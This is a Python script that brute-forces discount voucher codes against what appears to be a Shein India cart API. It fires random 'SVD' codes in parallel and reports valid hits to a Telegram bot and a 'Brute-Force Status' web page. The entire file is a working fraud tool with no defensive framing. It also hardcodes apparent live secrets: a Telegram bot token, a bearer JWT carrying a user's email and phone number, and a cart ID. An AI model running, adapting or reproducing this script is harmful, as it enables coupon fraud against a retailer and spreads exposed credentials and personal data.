import asyncio
import aiohttp
import random
import string
import os
import time
from aiohttp import web

# --- CONFIGURATION ---
BOT_TOKEN = "7960235034:AAGspuayD8vd-CnAkGp1LjpUv2RhcoopqKU"
CHAT_ID = "7177581474"
API_URL = "https://api.sheinindia.in/rilfnlwebservices/v2/rilfnl/users/manishisjh2@gmail.com/carts/SH7315703937/vouchers"

HEADERS = {
    "Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzaGVpbl9tYW5pc2hpc2poMkBnbWFpbC5jb20iLCJwa0lkIjoiYWQyZDk0ZWEtMjBiMi00YWNmLWI3MjItOTZlNjQ5NzY4OGYzIiwiY2xpZW50TmFtZSI6InRydXN0ZWRfY2xpZW50Iiwicm9sZXMiOlt7Im5hbWUiOiJST0xFX0NVU1RPTUVSR1JPVVAifV0sIm1vYmlsZSI6Ijc5NzMzNjYzOTgiLCJ0ZW5hbnRJZCI6IlNIRUlOIiwiZXhwIjoxNzcxNTgxNDQ0LCJ1dWlkIjoiYWQyZDk0ZWEtMjBiMi00YWNmLWI3MjItOTZlNjQ5NzY4OGYzIiwiaWF0IjoxNzY4OTg5NDQ0LCJlbWFpbCI6Im1hbmlzaGlzamgyQGdtYWlsLmNvbSJ9.mvm2vKeeoK-_qJ0dBGbsIldXLzfeBdj9lBYxH53r90Z4aU1G2hLJWJ7NsZlmyho2MIrYxpgOd2ahpZgD3wAFg8GdQTA0uv8_DxSoQfRQCCIfFSf3ZpFdScWDDJVOFtw1gzzGijGugyA0btZx6vNsPFL53HcTffb7tqDMvyG_qmBdEoIMxEMBJoAIaDrp2c8meLY51BbatloCqdaPSgjK4euqo_wf5lck9lyXirKUVJKzrXBSncAu8hbtT5RxDJ-RYW4AFS_jOVU1SsCUZJ5TDZRqLxhN1UBekUoq4PZMuBaV5hJ8cFgRlJlsGiXALje4vHcl0CWGoqLed7rRqd4h1w",
    "Accept": "application/json",
    "User-Agent": "Android",
    "Content-Type": "application/x-www-form-urlencoded",
}

# Global State
checked_count = 0
valid_hits = []  # Store codes in memory for the web page
start_time = time.time()
counter_lock = asyncio.Lock()

# --- WEB SERVER (View your codes here!) ---
async def handle_status(request):
    uptime = (time.time() - start_time) / 3600
    # Create a simple HTML page to show results
    html = f"""
    <html>
        <body style='font-family: sans-serif; padding: 20px; background: #f4f4f9;'>
            <h2>🚀 Brute-Force Status</h2>
            <p><b>Checked:</b> {checked_count}</p>
            <p><b>Valid Found:</b> {len(valid_hits)}</p>
            <p><b>Uptime:</b> {uptime:.2f} hours</p>
            <hr>
            <h3>🔥 Valid Codes Found:</h3>
            <ul>
                {"".join([f"<li><code>{code}</code></li>" for code in valid_hits]) if valid_hits else "<li>No hits yet...</li>"}
            </ul>
        </body>
    </html>
    """
    return web.Response(text=html, content_type='text/html')

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_status)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# --- CORE LOGIC ---
def generate_code():
    chars = string.ascii_uppercase + string.digits
    return "SVD" + ''.join(random.choices(chars, k=12))

async def send_telegram(session, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        async with session.post(url, json=payload, timeout=5) as r:
            return await r.json()
    except: pass

async def worker(session, sem):
    global checked_count
    while True:
        coupon = generate_code()
        payload = {"voucherId": coupon, "employeeOfferRestriction": "true"}
        async with sem:
            try:
                async with session.post(API_URL, data=payload, ssl=False) as resp:
                    resp_text = await resp.text()
                    async with counter_lock:
                        checked_count += 1
                        
                        # Logic: If no errors found in text
                        if '"errors"' not in resp_text.lower():
                            valid_hits.append(coupon)
                            print(f"✅ HIT: {coupon}")
                            await send_telegram(session, f"<b>🔥 HIT!</b>\n<code>{coupon}</code>")
                        
                        if checked_count % 1000 == 0:
                            await send_telegram(session, f"📊 <b>Stats:</b> {checked_count} checked. {len(valid_hits)} hits.")
            except:
                await asyncio.sleep(2)

async def main():
    await start_web_server()
    sem = asyncio.Semaphore(10) 
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        await send_telegram(session, "✅ <b>Bot Started on Render</b>")
        workers = [worker(session, sem) for _ in range(10)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
